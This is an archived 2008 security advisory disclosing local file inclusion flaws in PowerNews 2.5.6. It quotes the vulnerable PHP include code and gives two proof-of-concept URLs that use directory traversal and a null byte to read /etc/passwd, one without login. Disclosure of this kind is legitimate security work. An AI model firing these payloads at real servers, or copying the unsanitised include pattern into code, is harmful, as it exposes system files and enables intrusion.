<html><head><title>PowerNews (Newsscript) 2.5.6 Local File Inclusion Vulnerabilities</title></head><pre>Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-014


Application:                    PowerNews (Newsscript)
Versions Affected:              2.5.6
Vendor URL:                     http://www.powerscripts.org/
Bug:                            Multiple Local File Include
Exploits:                       YES
Reported:                       01.02.2008
Vendor Response:                none
Solution:                       none
Date of Public Advisory:        08.02.2008
Authors:                        Alexandr Polyakov, Stas Svistunovich
                                Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)



Description
***********

PowerNews (Newsscript) has Multiple Local File Include vulnerabilities.


1. Local File Include vulnerabilities found in scripts: 

pnadmin/categories.inc.php
pnadmin/news.inc.php
pnadmin/other.inc.php
pnadmin/permissions.inc.php
pnadmin/templates.inc.php
pnadmin/users.inc.php

Non-authentication user can directly access to this scripts.

Code
****
#################################################

  if ($_GET[subpage]) {
    if (file_exists($_GET[page].&quot;_&quot;.$_GET[subpage].&quot;.inc.php&quot;)) {
      include($_GET[page].&quot;_&quot;.$_GET[subpage].&quot;.inc.php&quot;);
    } else {
      ?&gt;&lt;center&gt;&lt;?PHP echo L_ALL_SUBPAGENOTFOUND; ?&gt;&lt;/center&gt;&lt;?PHP
    }
  } else {

#################################################

Example: 

http://[server]/[installdir]/pnadmin/categories.inc.php?subpage=../../../../../../../../../../../../../etc/passwd%00


2. Local File Include vulnerability found in script pnadmin/index.php in admin area.

Administrator can include local files.

Code
****
#################################################

    if ($pnloggedin != &quot;YES&quot;) {

      include(&quot;login.inc.php&quot;);

    } else {

      if (!$_GET[page]) { $_GET[page] = &quot;main&quot;; }
      if (file_exists($_GET[page].&quot;.inc.php&quot;)) { include($_GET[page].&quot;.inc.php&quot;); } else {

#################################################

Example:

http://[server]/[installdir]/pnadmin/index.php?page=../../../../../../../../../../../../../etc/passwd%00



About
*****

Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.


Contact:        research [at] dsec [dot] ru
                http://www.dsec.ru (in Russian)

# milw0rm.com [2008-02-08]</pre></html>